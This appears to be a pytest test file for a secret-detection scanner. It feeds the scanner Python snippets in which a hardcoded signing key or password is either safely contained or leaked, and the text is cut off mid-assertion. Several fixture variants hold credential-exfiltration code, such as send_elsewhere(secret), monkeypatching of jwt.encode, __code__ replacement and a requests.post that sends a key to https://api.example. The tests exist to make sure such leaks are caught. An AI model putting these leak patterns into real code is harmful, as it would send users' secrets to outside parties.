@pytest.mark.parametrize(
    "case",
    [
        "custom_model_save_exfil",
        "factory_create_assignment",
        "meta_eager_effect",
        "cross_module_provider_write",
        "assert_actual_eq_exfil",
    ],
)
def test_factory_authority_declines_effectful_review_counterexamples(tmp_path, case):
    import ast
    import hashlib
    from factoryline import mock_fixture_provenance as fixture

    sources = {
        "custom_model_save_exfil": {
            "domain.py": "from django.db import models\nclass Member(models.Model):\n    def save(self,*args,**kwargs):\n        send_elsewhere(self.password)\n",
            "builders.py": "import factory\nfrom domain import Member\nclass AccountBuilder(factory.django.DjangoModelFactory):\n    class Meta:\n        model = Member\n",
            "test_flow.py": "from rest_framework.test import APIClient\nfrom builders import AccountBuilder\ndef test_owned_authority():\n    password = 'sample-input'\n    account = AccountBuilder(password=password)\n    client = APIClient()\n    response = client.post('/session', {'id': account.id, 'password': password})\n    assert response.status_code == 200\n",
        },
        "factory_create_assignment": {
            "domain.py": "from django.db import models\nclass Member(models.Model):\n    pass\n",
            "builders.py": "import factory\nfrom domain import Member\nclass AccountBuilder(factory.django.DjangoModelFactory):\n    class Meta:\n        model = Member\n    _create = send_elsewhere\n",
            "test_flow.py": "from rest_framework.test import APIClient\nfrom builders import AccountBuilder\ndef test_owned_authority():\n    password = 'sample-input'\n    account = AccountBuilder(password=password)\n    client = APIClient()\n    response = client.post('/session', {'id': account.id, 'password': password})\n    assert response.status_code == 200\n",
        },
        "meta_eager_effect": {
            "domain.py": "from django.db import models\nclass Member(models.Model):\n    pass\n",
            "builders.py": "import factory\nfrom domain import Member\nclass AccountBuilder(factory.django.DjangoModelFactory):\n    class Meta:\n        model = Member\n        exclude = leak_metadata()\n",
            "test_flow.py": "from rest_framework.test import APIClient\nfrom builders import AccountBuilder\ndef test_owned_authority():\n    password = 'sample-input'\n    account = AccountBuilder(password=password)\n    client = APIClient()\n    response = client.post('/session', {'id': account.id, 'password': password})\n    assert response.status_code == 200\n",
        },
        "cross_module_provider_write": {
            "domain.py": "from django.db import models\nclass Member(models.Model):\n    pass\n",
            "builders.py": "import factory\nfrom domain import Member\nclass AccountBuilder(factory.django.DjangoModelFactory):\n    class Meta:\n        model = Member\n",
            "test_flow.py": "import mutate\nfrom rest_framework.test import APIClient\nfrom builders import AccountBuilder\ndef test_owned_authority():\n    password = 'sample-input'\n    account = AccountBuilder(password=password)\n    client = APIClient()\n    response = client.post('/session', {'id': account.id, 'password': password})\n    assert response.status_code == 200\n",
            "mutate.py": "from rest_framework.test import APIClient\nAPIClient.post = send_elsewhere\n",
        },
        "assert_actual_eq_exfil": {
            "domain.py": "from django.db import models\nclass Member(models.Model):\n    pass\n",
            "builders.py": "import factory\nfrom domain import Member\nclass AccountBuilder(factory.django.DjangoModelFactory):\n    class Meta:\n        model = Member\n",
            "test_flow.py": "from rest_framework.test import APIClient\nfrom builders import AccountBuilder\nclass Remote:\n    @property\n    def password(self):\n        return self\n    def __eq__(self, value):\n        send_elsewhere(value)\n        return True\nremote = Remote()\ndef test_owned_authority():\n    password = 'sample-input'\n    account = AccountBuilder(password=password)\n    client = APIClient()\n    response = client.post('/session', {'id': account.id, 'password': password})\n    assert response.status_code == 200\n    assert remote.password == password\n",
        },
    }[case]
    modules, captured, inventory = {}, {}, {}
    for name, text in sources.items():
        path = tmp_path / name
        raw = text.encode()
        path.write_bytes(raw)
        tree = ast.parse(raw)
        digest = hashlib.sha256(raw).hexdigest()
        tree._oracle_source_sha256 = digest
        modules[path], captured[path], inventory[path] = tree, raw, digest
    path = tmp_path / "test_flow.py"
    assignment = next(
        n
        for n in ast.walk(modules[path])
        if isinstance(n, ast.Assign)
        and isinstance(n.value, ast.Constant)
        and n.value.value == "sample-input"
    )
    index = fixture.application_test_index(tmp_path, modules, captured, inventory)
    evidence = fixture.application_test_secret_evidence(
        index, path, assignment.value.lineno, "sample-input"
    )
    assert evidence.get("eligible") is not True, evidence


def test_unrelated_package_alias_collision_keeps_unambiguous_source_roles(tmp_path):
    import ast
    import hashlib
    from factoryline import mock_fixture_provenance as fixture

    files = {
        "first/tests/__init__.py": b"",
        "first/tests/helpers.py": b"",
        "second/tests/__init__.py": b"",
        "second/tests/helpers.py": b"",
        "independent.py": b"VALUE = 1\n",
    }
    modules, captured, inventory = {}, {}, {}
    for name, raw in files.items():
        path = tmp_path / name
        tree = ast.parse(raw)
        tree._oracle_source_sha256 = hashlib.sha256(raw).hexdigest()
        modules[path], captured[path], inventory[path] = (
            tree,
            raw,
            tree._oracle_source_sha256,
        )
    index = fixture.application_test_index(tmp_path, modules, captured, inventory)
    assert index is not None
    assert fixture._django_mod(index, "tests.helpers") == (None, None)
    assert fixture._django_mod(index, "independent")[0] == tmp_path / "independent.py"


@pytest.mark.parametrize(
    "variant",
    [
        "direct",
        "wrapper",
        "escape",
        "result_escape",
        "key_not_key",
        "provider_write",
        "backend_provider_write",
        "namespace_write",
        "namespace_escape",
        "wrapper_leak",
        "wrapper_rebound",
        "overloaded_assertion",
        "unrelated_token",
        "wrapper_returns_input",
        "decoded_payload_use",
    ],
)
def test_signing_authority_role_requires_exact_key_flow_and_closed_result(
    tmp_path, variant
):
    import ast
    import hashlib
    from factoryline import mock_fixture_provenance as fixture

    sources = _signing_authority_role_sources()
    _apply_signing_authority_role_variant(sources, variant)
    modules, captured, inventory = {}, {}, {}
    for name, text in sources.items():
        path = tmp_path / name
        raw = text.encode()
        tree = ast.parse(raw)
        tree._oracle_source_sha256 = hashlib.sha256(raw).hexdigest()
        modules[path], captured[path], inventory[path] = (
            tree,
            raw,
            tree._oracle_source_sha256,
        )
    index = fixture.application_test_index(tmp_path, modules, captured, inventory)
    tree = modules[tmp_path / "test_flow.py"]
    assignment = next(
        n
        for n in ast.walk(tree)
        if isinstance(n, ast.Assign)
        and isinstance(n.value, ast.Constant)
        and n.value.value == "local-signing-material"
    )
    evidence = fixture.application_test_secret_evidence(
        index,
        tmp_path / "test_flow.py",
        assignment.value.lineno,
        "local-signing-material",
    )
    assert (evidence.get("eligible") is True) is (
        variant in {"direct", "wrapper", "decoded_payload_use"}
    ), evidence


@pytest.mark.parametrize("variant", ["direct", "inline", "key_escape", "digest_escape", "helper_effect", "provider_write", "provider_escape", "source_write", "unknown_operand", "overridden_assertion", "key_in_payload", "wrong_slot"])
def test_shared_digest372_closed_key_and_computed_result(tmp_path, variant):
    from factoryline import mock_fixture_provenance as fixture

    helper = "import hmac\nimport hashlib\ndef calculate(key, timestamp, body):\n    message = '{}.{}'.format(timestamp, body).encode()\n    return hmac.new(key.encode(), message, hashlib.sha256).hexdigest()\n"
    caller = "from django.test import TestCase\nimport codec\nclass Checks(TestCase):\n    def test_local_key(self):\n        secret = 'owned-digest-input'\n        body = '{}'\n        observed = codec.calculate(secret, 1000, body)\n        self.assertEqual(observed, codec.calculate(secret, 1000, body))\n"
    if variant == "inline":
        caller = caller.replace("        observed = codec.calculate(secret, 1000, body)\n        self.assertEqual(observed,", "        self.assertNotEqual(codec.calculate(secret, 1001, body),")
    elif variant == "key_escape":
        caller += "        publish(secret)\n"
    elif variant == "digest_escape":
        caller += "        publish(observed)\n"
    elif variant == "helper_effect":
        helper = helper.replace("    message =", "    publish(key)\n    message =")
    elif variant == "provider_write":
        helper += "hmac.new = replacement\n"
    elif variant == "provider_escape":
        caller += "        opaque(codec)\n"
    elif variant == "source_write":
        caller += "        codec.calculate.__code__ = replacement\n"
    elif variant == "unknown_operand":
        caller = caller.replace("body = '{}'", "body = unknown()")
    elif variant == "overridden_assertion":
        caller += "    def assertEqual(self, *args):\n        pass\n"
    elif variant == "key_in_payload":
        helper = helper.replace("timestamp, body).encode()", "timestamp, key).encode()")
    elif variant == "wrong_slot":
        caller = caller.replace("calculate(secret, 1000, body)", "calculate(body, 1000, secret)")
    modules, captured, inventory = {}, {}, {}
    for name, text in {"codec.py": helper, "test_flow.py": caller}.items():
        path = tmp_path / name
        raw = text.encode()
        tree = ast.parse(raw)
        tree._oracle_source_sha256 = hashlib.sha256(raw).hexdigest()
        modules[path], captured[path], inventory[path] = tree, raw, tree._oracle_source_sha256
    index = fixture.application_test_index(tmp_path, modules, captured, inventory)
    evidence = fixture.application_test_secret_evidence(index, tmp_path / "test_flow.py", 5, "owned-digest-input")
    assert (evidence.get("eligible") is True) is (variant in {"direct", "inline"}), evidence
    if evidence.get("eligible"):
        assert evidence["profile"] == "SOURCE_BOUND_DIGEST_TEST_AUTHORITY"


def test_shared_digest372_all_role_profiles_capture_complete_verifier_inputs(tmp_path):
    from factoryline.audit_action_refs import _captured_application_source_bytes

    payloads = {"test_flow.py": b"pass\n", "codec.py": b"pass\n", "requirements.txt": b"Django\n"}
    for name, raw in payloads.items():
        (tmp_path / name).write_bytes(raw)
    bindings = [{"path": name, "sha256": hashlib.sha256(raw).hexdigest()}
                for name, raw in payloads.items() if name.endswith(".py")]
    finding = {"code": "SECURITY_HARDCODED_SECRET", "path": "test_flow.py", "facts": {
        "name": "secret", "fixture_evidence": {"classification": "APPLICATION_TEST_CREDENTIAL_ROLE",
            "profile": "SOURCE_BOUND_DIGEST_TEST_AUTHORITY",
            "configuration_sha256": {"requirements.txt": hashlib.sha256(payloads["requirements.txt"]).hexdigest()}}}}
    captured = _captured_application_source_bytes(tmp_path, [finding], bindings, {tmp_path / name: raw for name, raw in payloads.items() if name.endswith(".py")})
    assert captured == payloads


def _signing_authority_role_sources():
    return {
        "codec.py": "import jwt\nclass Envelope:\n    def encode(self, secret):\n        return jwt.encode({}, key=secret, algorithm='HS256')\n    @classmethod\n    def decode(cls, token, secret):\n        return jwt.decode(token, key=secret, algorithms=['HS256'])\n",
        "test_flow.py": "import jwt\nfrom codec import Envelope\ndef test_key():\n    secret = 'local-signing-material'\n    token = jwt.encode({}, key=secret, algorithm='HS256')\n    decoded = jwt.decode(token, key=secret, algorithms=['HS256'])\n    assert decoded == {}\n",
    }


def _apply_signing_authority_role_variant(sources, variant):
    if variant in {
        "wrapper",
        "wrapper_leak",
        "wrapper_rebound",
        "wrapper_returns_input",
    }:
        sources["test_flow.py"] = (
            sources["test_flow.py"]
            .replace(
                "    token = jwt.encode({}, key=secret, algorithm='HS256')",
                "    envelope = Envelope()\n    token = envelope.encode(secret=secret)",
            )
            .replace(
                "jwt.decode(token, key=secret, algorithms=['HS256'])",
                "Envelope.decode(token, secret=secret)",
            )
        )
    replacements = {
        "key_not_key": [
            (
                "test_flow.py",
                "jwt.encode({}, key=secret",
                "jwt.encode(secret, key='different'",
            )
        ],
        "wrapper_rebound": [
            (
                "test_flow.py",
                "    token = envelope",
                "    envelope.encode = send_elsewhere\n    token = envelope",
            )
        ],
        "unrelated_token": [
            ("test_flow.py", "jwt.decode(token,", "jwt.decode('external-token',")
        ],
        "wrapper_leak": [
            (
                "codec.py",
                "        return jwt.encode",
                "        send_elsewhere(secret)\n        return jwt.encode",
            )
        ],
        "wrapper_returns_input": [
            (
                "codec.py",
                "        return jwt.decode(token, key=secret, algorithms=['HS256'])",
                "        data = jwt.decode(token, key=secret, algorithms=['HS256'])\n        return token",
            )
        ],
    }
    for name, before, after in replacements.get(variant, []):
        sources[name] = sources[name].replace(before, after)
    additions = {
        "escape": ("test_flow.py", "    send_elsewhere(secret)\n"),
        "result_escape": ("test_flow.py", "    send_elsewhere(token)\n"),
        "overloaded_assertion": (
            "test_flow.py",
            "    assert remote.password == secret\n",
        ),
        "decoded_payload_use": ("test_flow.py", "    inspect_claims(decoded)\n"),
    }
    if variant in additions:
        name, addition = additions[variant]
        sources[name] += addition
    mutators = {
        "provider_write": "jwt.encode = send_elsewhere",
        "backend_provider_write": "jwt.api_jws.encode = send_elsewhere",
        "namespace_write": "jwt.__dict__['encode'] = send_elsewhere",
        "namespace_escape": "send_elsewhere(jwt)",
    }
    if variant in mutators:
        sources["mutator.py"] = "import jwt\n" + mutators[variant] + "\n"
        sources["test_flow.py"] = "import mutator\n" + sources["test_flow.py"]


_CLASS_SIGNING264 = """import jwt
class TestSigning:
    secret = 'class-owned-signing-material'
    def test_roundtrip(self):
        token = jwt.encode({}, key=self.secret, algorithm='HS256')
        decoded = jwt.decode(token, key=self.secret, algorithms=['HS256'])
        assert decoded == {}
"""


@pytest.mark.parametrize(
    "variant",
    [
        "closed",
        "key_export",
        "token_export",
        "receiver_export",
        "bound_method_export",
        "class_export",
        "class_mutation",
        "instance_mutation",
        "inheritance",
        "provider_mutation",
        "reflection",
        "unrelated_token",
        "class_body_constructor",
    ],
)
def test_class_signing264_native_source_ownership(tmp_path, variant):
    text = _CLASS_SIGNING264
    additions = {
        "key_export": "        send(self.secret)\n",
        "token_export": "        send(token)\n",
        "receiver_export": "        send(self)\n",
        "bound_method_export": "        send(self.test_roundtrip)\n",
        "class_export": "exported = TestSigning\n",
        "class_mutation": "TestSigning.secret = 'other'\n",
        "instance_mutation": "        self.secret = 'other'\n",
        "provider_mutation": "jwt.encode = send\n",
        "reflection": "        getattr(self, 'secret')\n",
    }
    text += additions.get(variant, "")
    if variant == "inheritance":
        text = text.replace("class TestSigning:", "class TestSigning(External):")
    elif variant == "unrelated_token":
        text = text.replace("jwt.decode(token,", "jwt.decode('external-token',")
    elif variant == "class_body_constructor":
        text = text.replace(
            "    def test_roundtrip",
            "    signer = Unknown(secret)\n    def test_roundtrip",
        )
    _write(tmp_path, "test_class_signing.py", text)
    for report in (
        security_scan(tmp_path),
        security_scan(tmp_path),
        security_scan(tmp_path, cache_enabled=False),
    ):
        active = [
            row
            for row in report["findings"]
            if row["code"] == "SECURITY_HARDCODED_SECRET"
        ]
        observed = [
            row
            for row in report.get("primitive_observations", [])
            if row["code"] == "SECURITY_HARDCODED_SECRET"
        ]
        if variant == "closed":
            assert not active, report
            assert observed, report
        else:
            assert active and all(row["severity"] == "CRITICAL" for row in active), (
                report
            )


@pytest.mark.parametrize(
    "acquisition",
    [
        "import test_flow\ninstall(test_flow.TestSigning)\n",
        "import test_flow as module\ninstall(module)\n",
        "from importlib import import_module as load\ninstall(load('test_flow'))\n",
        "import sys\ninstall(sys.modules['test_flow'])\n",
        "from sys import modules as table\ninstall(table['test_flow'])\n",
        "install(__builtins__['__import__']('test_flow'))\n",
        "for owner in object.__subclasses__():\n    if owner.__name__ == 'TestSigning':\n        install(owner)\n",
    ],
)
def test_class_signing264_namespace_escape_stays_active(tmp_path, acquisition):
    _write(tmp_path, "test_flow.py", _CLASS_SIGNING264)
    _write(tmp_path, "configure.py", "from sink import install\n" + acquisition)
    _write(
        tmp_path,
        "sink.py",
        "import requests\ndef install(owner):\n"
        "    key = getattr(owner, 'secret', None)\n"
        "    requests.post('https://api.example', headers={'Authorization': key})\n",
    )
    for report in (
        security_scan(tmp_path),
        security_scan(tmp_path),
        security_scan(tmp_path, cache_enabled=False),
    ):
        active = [
            row
            for row in report["findings"]
            if row["code"] == "SECURITY_HARDCODED_SECRET"
        ]
        assert active and all(row["severity"] == "CRITICAL" for row in active), report


@pytest.mark.parametrize("cross_file", [False, True])
def test_class_signing264_source_drift_reopens_alert(tmp_path, cross_file):
    _write(tmp_path, "test_flow.py", _CLASS_SIGNING264)
    first = security_scan(tmp_path)
    assert first.get("primitive_observations"), first
    if cross_file:
        _write(
            tmp_path,
            "consumer.py",
            "from test_flow import TestSigning\nsend(TestSigning)\n",
        )
    else:
        _write(
            tmp_path, "test_flow.py", _CLASS_SIGNING264 + "        send(self.secret)\n"
        )
    for report in (
        security_scan(tmp_path),
        security_scan(tmp_path, cache_enabled=False),
    ):
        active = [
            row
            for row in report["findings"]
            if row["code"] == "SECURITY_HARDCODED_SECRET"
        ]
        assert active and all(row["severity"] == "CRITICAL" for row in active), report


_OBJECT_SIGNING265 = """from slack_sdk.signature import SignatureVerifier
class Gate:
    def __init__(self, key):
        self._key = key
    def check(self, signature):
        verifier = SignatureVerifier(self._key)
        return verifier.is_valid('body', 'timestamp', signature)
class TestSigning:
    signing_secret = 'class-owned-signing-material'
    signer = SignatureVerifier(signing_secret)
    def test_roundtrip(self):
        signature = self.signer.generate_signature(body='body', timestamp='timestamp')
        gate = Gate(self.signing_secret)
        assert gate.check(signature)
"""


_REQUEST_SIGNING273 = """from slack_sdk.signature import SignatureVerifier
from typing import Optional, Dict, Sequence, Union
class Response:
    def __init__(self, *, status, body=''):
        self.status = status
        self.body = body
def next_response():
    return Response(status=200, body='next')
def normalize(headers: Optional[Dict[str, Union[str, Sequence[str]]]]) -> Dict[str, Sequence[str]]:
    normalized = {}
    if headers is not None:
        for key, value in headers.items():
            normalized_name = key.lower()
            if isinstance(value, list):
                normalized[normalized_name] = value
            elif isinstance(value, str):
                normalized[normalized_name] = [value]
            else:
                raise ValueError(type(value))
    return normalized
class Request:
    def __init__(self, *, body, headers, mode='http'):
        if mode == 'http':
            self.raw_body = body if body is not None else ''
        else:
            self.raw_body = ''
        self.headers = normalize(headers)
        self.mode = mode
        self.body = {}
class Gate:
    def __init__(self, key):
        self._key = key
        self._verifier = None
    @property
    def verifier(self):
        if self._verifier is None:
            self._verifier = SignatureVerifier(self._key)
        return self._verifier
    def process(self, *, req, resp, next):
        if self._skip(req.mode, req.body):
            return next()
        body = req.raw_body
        timestamp = req.headers.get('timestamp', ['0'])[0]
        signature = req.headers.get('signature', [''])[0]
        if self.verifier.is_valid(body, timestamp, signature):
            return next()
        else:
            return Response(status=401)
    @staticmethod
    def _skip(mode, body):
        return mode == 'socket_mode'
class TestSigning:
    signing_secret = 'class-owned-signing-material'
    signer = SignatureVerifier(signing_secret)
    def generate_signature(self, body: str, timestamp: str):
        return self.signer.generate_signature(body=body, timestamp=timestamp)
    def build_headers(self, timestamp: str, body: str):
        return {'signature': [self.generate_signature(body, timestamp)], 'timestamp': [timestamp]}
    def test_roundtrip(self):
        gate = Gate(self.signing_secret)
        raw = 'payload'
        timestamp = '123'
        req = Request(body=raw, headers=self.build_headers(timestamp, raw))
        resp = Response(status=404)
        resp = gate.process(req=req, resp=resp, next=next_response)
        assert resp.status == 200
    def test_invalid(self):
        gate = Gate(self.signing_secret)
        req = Request(body='payload', headers={})
        resp = Response(status=404)
        resp = gate.process(req=req, resp=resp, next=next_response)
        assert resp.status == 401
"""


@pytest.mark.parametrize(
    "variant",
    [
        "closed",
        "normalizer-write",
        "normalizer-export",
        "normalizer-alias-write",
        "wrong-key",
        "swapped-producer",
        "bypass",
        "request-write",
        "receiver-export",
        "normalizer-loop-write",
        "normalizer-rebind",
        "lowercase-collision",
        "wrong-skip-receiver",
    ],
)
def test_request273_selected_signature_closure_native(tmp_path, variant):
    text = _REQUEST_SIGNING273
    changes = {
        "normalizer-write": (
            "    return normalized",
            "    normalized['signature'] = ['forged']\n    return normalized",
        ),
        "normalizer-export": (
            "    return normalized",
            "    send(normalized)\n    return normalized",
        ),
        "normalizer-alias-write": (
            "    return normalized",
            "    alias = normalized\n    alias['signature'] = ['forged']\n    return normalized",
        ),
        "wrong-key": (
            "signer = SignatureVerifier(signing_secret)",
            "signer = SignatureVerifier('other-key')",
        ),
        "swapped-producer": (
            "generate_signature(body=body, timestamp=timestamp)",
            "generate_signature(body=timestamp, timestamp=body)",
        ),
        "bypass": (
            "        body = req.raw_body",
            "        return next()\n        body = req.raw_body",
        ),
        "request-write": (
            "        resp = Response(status=404)",
            "        req.headers['signature'] = ['forged']\n        resp = Response(status=404)",
        ),
        "receiver-export": (
            "            return Response(status=401)",
            "            return self._error()\n    def _error(self):\n        send(self)\n        return Response(status=401)",
        ),
        "normalizer-loop-write": (
            "    return normalized",
            "            normalized[normalized_name] = ['forged']\n    return normalized",
        ),
        "normalizer-rebind": (
            "            normalized_name = key.lower()",
            "            value = ['forged']\n            normalized_name = key.lower()",
        ),
        "lowercase-collision": (
            "'timestamp': [timestamp]}",
            "'timestamp': [timestamp], 'SIGNATURE': ['forged']}",
        ),
        "wrong-skip-receiver": ("self._skip(req.mode", "other._skip(req.mode"),
    }
    if variant in changes:
        text = text.replace(*changes[variant])
    _write(tmp_path, "test_signing.py", text)
    report = security_scan(tmp_path, cache_enabled=False)
    active = [
        row for row in report["findings"] if row["code"] == "SECURITY_HARDCODED_SECRET"
    ]
    if variant == "closed":
        assert not active and report.get("primitive_observations"), report
    else:
        assert active and all(row["severity"] == "CRITICAL" for row in active), report


@pytest.mark.parametrize(
    "variant",
    ["readonly", "write", "escape", "first-argument", "shadow", "annotation-export"],
)
def test_request273_typing_provider_reads_do_not_forgive_mutation(tmp_path, variant):
    text = (
        _REQUEST_SIGNING273
        + "\ndef classify(value):\n    return isinstance(value, Sequence)\n"
    )
    suffix = {
        "write": "Sequence.__getitem__ = opaque\n",
        "escape": "register(Sequence)\n",
        "first-argument": "def classify_again(value):\n    return isinstance(Sequence, value)\n",
        "shadow": "def classify_again(value, isinstance=opaque):\n    return isinstance(value, Sequence)\n",
        "annotation-export": "def classify_again(value: Evil[Sequence]):\n    return None\n",
    }
    _write(tmp_path, "test_signing.py", text + suffix.get(variant, ""))
    report = security_scan(tmp_path, cache_enabled=False)
    active = [
        row for row in report["findings"] if row["code"] == "SECURITY_HARDCODED_SECRET"
    ]
    if variant == "readonly":
        assert not active and report.get("primitive_observations"), report
    else:
        assert active and all(row["severity"] == "CRITICAL" for row in active), report


@pytest.mark.parametrize(
    "variant",
    [
        "closed",
        "key_export",
        "owner_export",
        "gate_export",
        "provider_write",
        "raw_field_export",
        "constructor_escape",
        "no_signer_use",
        "other_key",
        "signature_export",
        "verifier_export",
        "verifier_transmit",
        "returned_verifier",
        "unrelated_signature",
        "unused_verifier",
        "unused_signature",
        "signature_formal_export",
        "verifier_alias",
        "hidden_verifier_export",
        "constructor_method_export",
        "verification_method_export",
    ],
)
def test_object_signing265_constructor_field_native(tmp_path, variant):
    text = _object_signing265_constructor_variant(variant)
    _write(tmp_path, "test_signing.py", text)
    declaration_line = next(
        node.lineno
        for node in ast.walk(ast.parse(text))
        if isinstance(node, ast.Constant)
        and node.value == "class-owned-signing-material"
    )
    for report in (
        security_scan(tmp_path),
        security_scan(tmp_path, cache_enabled=False),
    ):
        active = [
            row
            for row in report["findings"]
            if row["code"] == "SECURITY_HARDCODED_SECRET"
            and row["line"] == declaration_line
        ]
        observed = [
            row
            for row in report.get("primitive_observations", [])
            if row["code"] == "SECURITY_HARDCODED_SECRET"
            and row["line"] == declaration_line
        ]
        if variant == "closed":
            assert not active and observed, report
        else:
            assert active and all(row["severity"] == "CRITICAL" for row in active), (
                report
            )


def _object_signing265_constructor_variant(variant):
    extras = {
        "key_export": "        send(self.signing_secret)\n",
        "owner_export": "        send(self)\n",
        "gate_export": "        send(gate)\n",
        "provider_write": "SignatureVerifier.generate_signature = send\n",
        "signature_export": "        requests.post('https://api.example', headers={'X-Slack-Signature': signature})\n",
        "unused_signature": "        unused = self.signer.generate_signature(body='body', timestamp='timestamp')\n",
    }
    replacements = {
        "raw_field_export": [
            (
                "        return verifier.is_valid",
                "        send(self._key)\n        return verifier.is_valid",
            )
        ],
        "constructor_escape": [
            ("        self._key = key", "        self._key = key\n        send(self)")
        ],
        "no_signer_use": [
            (
                "self.signer.generate_signature(body='body', timestamp='timestamp')",
                "'signature'",
            )
        ],
        "other_key": [
            ("SignatureVerifier(signing_secret)", "SignatureVerifier('different-key')")
        ],
        "verifier_export": [
            (
                "        return verifier.is_valid",
                "        send(verifier)\n        return verifier.is_valid",
            )
        ],
        "verifier_transmit": [
            (
                "        return verifier.is_valid",
                "        requests.post('https://api.example', headers={'X-Slack-Signature': verifier.generate_signature(body='body', timestamp='timestamp')})\n        return verifier.is_valid",
            )
        ],
        "returned_verifier": [
            (
                "return verifier.is_valid('body', 'timestamp', signature)",
                "return verifier",
            ),
            ("assert gate.check(signature)", "send(gate.check(signature))"),
        ],
        "unrelated_signature": [
            ("assert gate.check(signature)", "assert gate.check('external-signature')")
        ],
        "unused_verifier": [("        assert gate.check(signature)\n", "")],
        "signature_formal_export": [
            (
                "        return verifier.is_valid",
                "        send(signature)\n        return verifier.is_valid",
            )
        ],
        "verifier_alias": [
            (
                "        return verifier.is_valid",
                "        alias = verifier\n        return verifier.is_valid",
            )
        ],
        "hidden_verifier_export": [
            (
                "class TestSigning:",
                "    def unused(self):\n        verifier = SignatureVerifier(self._key)\n        send(verifier)\nclass TestSigning:",
            )
        ],
        "constructor_method_export": [
            (
                "        self._key = key",
                "        self._key = key\n        register(self.check)",
            )
        ],
        "verification_method_export": [
            (
                "        verifier = SignatureVerifier(self._key)",
                "        register(self.check)\n        verifier = SignatureVerifier(self._key)",
            )
        ],
    }
    text = _OBJECT_SIGNING265 + extras.get(variant, "")
    for before, after in replacements.get(variant, []):
        text = text.replace(before, after)
    return text


@pytest.mark.parametrize(
    "variant",
    [
        "closed",
        "raw_export",
        "field_export",
        "method_export",
        "nested_capture",
        "formal_rebind",
        "class_write",
        "reflective_read",
        "replacement",
        "effectful_annotation",
        "effectful_default",
        "decorated",
        "key_export",
        "signature_export",
        "code_replacement",
        "aliased_code_replacement",
        "function_export",
        "nested_effectful_metadata",
        "global_metadata_receiver",
        "configured_logger_factory",
        "configured_logger_manager",
        "dynamic_module_metadata",
    ],
)
def test_object_signing266_metadata_native(tmp_path, variant):
    text = _object_signing266_metadata_variant(variant)
    _write(tmp_path, "test_signing.py", text)
    declaration_line = next(
        node.lineno
        for node in ast.walk(ast.parse(text))
        if isinstance(node, ast.Constant)
        and node.value == "class-owned-signing-material"
    )
    for report in (
        security_scan(tmp_path),
        security_scan(tmp_path, cache_enabled=False),
    ):
        active = [
            row
            for row in report["findings"]
            if row["code"] == "SECURITY_HARDCODED_SECRET"
            and row["line"] == declaration_line
        ]
        observed = [
            row
            for row in report.get("primitive_observations", [])
            if row["code"] == "SECURITY_HARDCODED_SECRET"
            and row["line"] == declaration_line
        ]
        if variant == "closed":
            assert not active and observed, report
        else:
            assert (
                active
                and all(row["severity"] == "CRITICAL" for row in active)
                and not observed
            ), report


def _object_signing266_metadata_variant(variant):
    helper = """import logging
from logging import Logger
from typing import Any, Optional
def describe(cls: Any, logger: Optional[Logger] = None) -> Logger:
    return logging.getLogger(f'local.{cls.__name__}')
"""
    text = _OBJECT_SIGNING265.replace(
        "        self._key = key",
        "        self._key = key\n        self.label = describe(Gate)",
    )
    changes = {
        "raw_export": "    send(cls)\n",
        "field_export": "    send(cls.authority)\n",
        "method_export": "    register(cls.check)\n",
        "nested_capture": "    def inner():\n        return cls.__name__\n",
        "formal_rebind": "    cls = attacker\n",
        "class_write": "    cls.authority = 'changed'\n",
        "reflective_read": "    getattr(cls, 'authority')\n",
    }
    helper = helper.replace(
        "    return logging.getLogger",
        changes.get(variant, "") + "    return logging.getLogger",
    )
    helper = helper.replace(
        "cls.__name__",
        {"dynamic_module_metadata": "cls.__module__"}.get(variant, "cls.__name__"),
    )
    metadata_replacements = {
        "effectful_annotation": [("cls: Any", "cls: mutate()")],
        "effectful_default": [("= None", "= mutate()")],
        "decorated": [("def describe", "@transform\ndef describe")],
        "nested_effectful_metadata": [
            ("f'local.{cls.__name__}'", "f'{leak(secret).__name__}.{cls.__name__}'")
        ],
        "global_metadata_receiver": [
            ("f'local.{cls.__name__}'", "f'{external.__name__}.{cls.__name__}'")
        ],
    }
    text_additions = {
        "replacement": "describe = send\n",
        "key_export": "        send(self.signing_secret)\n",
        "signature_export": "        send(signature)\n",
        "function_export": "send(describe)\n",
    }
    code_replacement = "\ndef transmit(self, signature):\n    requests.post('https://api.example', headers={'Authorization': self._key})\n    return True\ndef attacker(cls):\n    cls.check = transmit\n    return 'changed'\n"
    text += text_additions.get(variant, "")
    if variant in {"code_replacement", "aliased_code_replacement"}:
        text += code_replacement
        text += {
            "code_replacement": "describe.__code__ = attacker.__code__\n",
            "aliased_code_replacement": "replacement = describe\nreplacement.__code__ = attacker.__code__\n",
        }[variant]
    for before, after in metadata_replacements.get(variant, []):
        helper = helper.replace(before, after)
    helper += {
        "configured_logger_factory": "class ExportingLogger(logging.Logger):\n    def __init__(self, name):\n        send(TestSigning.signing_secret)\nlogging.setLoggerClass(ExportingLogger)\n",
        "configured_logger_manager": "logging.Logger.manager = external\n",
    }.get(variant, "")
    if variant == "dynamic_module_metadata":
        text = text.replace("class Gate:", "class Gate:\n    __module__ = external")
    text = helper + text
    return text


@pytest.mark.parametrize("kind", ["def", "async def", "class"])
def test_source_alias266_exact_local_definition_identity(tmp_path, kind):
    from factoryline import credential_role_constructor_provider as provider

    path = tmp_path / "provider.py"
    tree = ast.parse(
        f"{kind} chosen():\n    pass\n"
        if kind != "class"
        else "class chosen:\n    pass\n"
    )
    assert (
        provider._source_aliases(path, tree, {}, None)["chosen"]
        == provider._source_module(path) + ".chosen"
    )
    tree = ast.parse("def chosen():\n    pass\nchosen = replacement\n")
    assert "chosen" not in provider._source_aliases(path, tree, {}, None)
    assert provider._source_aliases in provider.constructor_provider_helper_epoch()


@pytest.mark.parametrize(
    "variant",
    [
        "closed",
        "field_export",
        "property_export",
        "property_alias",
        "property_return",
        "field_mutation",
        "getter_extra",
        "getter_replacement",
        "property_shadow",
        "signature_export",
        "bound_method_export",
        "receiver_rebind",
        "getter_default_effect",
        "getter_annotation_effect",
    ],
)
def test_signing267_lazy(tmp_path, variant):
    text = _signing267_lazy_variant(variant)
    _write(tmp_path, "test_signing.py", text)
    line = next(
        node.lineno
        for node in ast.walk(ast.parse(text))
        if isinstance(node, ast.Constant)
        and node.value == "class-owned-signing-material"
    )
    for report in (
        security_scan(tmp_path),
        security_scan(tmp_path, cache_enabled=False),
    ):
        active = [
            row
            for row in report["findings"]
            if row["code"] == "SECURITY_HARDCODED_SECRET" and row["line"] == line
        ]
        observed = [
            row
            for row in report.get("primitive_observations", [])
            if row["code"] == "SECURITY_HARDCODED_SECRET" and row["line"] == line
        ]
        if variant == "closed":
            assert not active and observed, report
        else:
            assert (
                active
